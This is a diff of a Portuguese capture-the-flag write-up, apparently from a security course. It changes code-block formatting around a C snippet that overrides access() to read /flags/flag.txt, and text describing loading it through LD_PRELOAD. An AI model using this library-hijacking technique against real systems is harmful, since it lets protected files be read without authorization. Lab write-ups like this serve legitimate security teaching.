@@ -64,8 +64,9 @@
 * Ora, com base no descoberto anteriormente e numa tentativa de aproveitar a chamada periódica do servidor à função ```access("/flags/flag.txt")```, pensamos em criar uma função ```access()``` com a mesma assinatura da função original, mas cujo objetivo (malicioso) seria ler a *flag* do ficheiro passado como parâmetro e escrevê-la no novo ficheiro *new* criado por nós
 
 * Criamos um código C com esta finalidade e colocamo-lo (com ```echo```) num novo ficheiro *mylib.c*
-'''csharp
-echo '#include <stdio.h>
+```
+echo '
+    #include <stdio.h>
     int access(const char *pathname, int mode) {
         char flag[1000];
         FILE *r = fopen("/flags/flag.txt", "rb");
@@ -77,7 +78,7 @@ echo '#include <stdio.h>
         return 0;
     }
 ' >> mylib.c
-'''
+```
 
 * A vulnerabilidade a explorar para alcançar o nosso objetivo seria abusar da variável de ambiente LD_PRELOAD, isto é, editarmos o ficheiro *env* para conter LD_PRELOAD=..., sendo ... o nome de uma biblioteca partilhada criada por nós a partir do ficheiro *mylib.c* escrito anteriormente
 
